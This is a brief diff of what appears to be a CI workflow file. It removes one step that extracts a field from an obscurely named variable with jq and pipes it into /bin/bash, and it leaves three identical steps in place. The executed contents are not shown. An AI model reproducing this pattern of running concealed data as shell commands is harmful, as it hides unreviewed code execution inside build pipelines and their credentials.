@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$jl189" | jq -r .v586 | /bin/bash
           printf '%s' "$nf9" | jq -r .xei64 | /bin/bash
           echo $pb902 | jq -r .o16345 | /bin/bash
-          echo $zybb568 | jq -r .e8942 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
